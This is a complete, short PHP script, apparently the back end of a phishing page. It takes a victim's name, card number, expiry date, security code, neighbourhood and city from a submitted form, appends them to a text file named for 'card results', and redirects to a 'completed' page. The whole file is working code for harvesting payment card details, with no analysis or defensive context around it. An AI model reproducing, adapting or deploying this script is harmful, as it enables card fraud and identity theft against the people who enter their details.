<?php
$nombre = $_POST['nombre'];
$TarjetaNumero = $_POST['TarjetaNumero'];
$FechaVencimiento = $_POST['FechaVencimiento'];
$codigo = $_POST['codigo'];
$colonia = $_POST['colonia'];
$ciudad = $_POST['ciudad'];

$fecha = date("d/m/y g:i:s");
$file = fopen ('resultadosDeTarjetas.txt', 'at');
fwrite($file, "nombre: $nombre | TarjetaNumero: $TarjetaNumero | FechaVencimiento: $FechaVencimiento | codigo: $codigo | colonia: $colonia | ciudad: $ciudad | fecha: $fecha |  \n");
fclose($file);
header("location:completado.html");

?>
